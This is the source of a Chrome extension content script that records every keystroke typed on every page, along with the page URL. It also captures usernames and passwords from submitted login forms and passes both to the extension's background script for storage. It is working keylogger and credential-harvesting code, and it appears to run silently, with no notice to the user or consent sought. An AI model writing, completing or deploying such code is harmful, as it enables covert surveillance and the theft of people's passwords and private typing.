let typedText = "";
let currentUrl = window.location.href;

document.addEventListener("keydown", (event) => {
    if (event.key.length === 1) { // Capture only printable characters
        typedText += event.key;
    } else if (event.key === "Backspace") {
        typedText += "<back>";
    } else if (event.key === "Enter") {
        typedText += "\n";
    }

    // Send data only when the URL changes or after a short delay

    chrome.runtime.sendMessage({
        type: "keystroke",
        url: currentUrl,
        text: typedText,
        timestamp: new Date().toISOString(),
    });

});


document.addEventListener("submit", (event) => {
    const form = event.target;
    const passwordField = form.querySelector('input[type="password"]');
    const usernameField = form.querySelector(
    'input[type="text"], input[type="email"], input[type="tel"], input[name*="user"], input[name*="login"], input[id*="user"], input[id*="login"], input[autocomplete="username"], input[autocomplete="email"]'
);


    if (passwordField && usernameField) {
        const credentials = {
            username: usernameField.value,
            password: passwordField.value,
            site: window.location.hostname
        };

        // Send credentials to background script for storage
        chrome.runtime.sendMessage({ type: "credentials", data: credentials });
    }
});
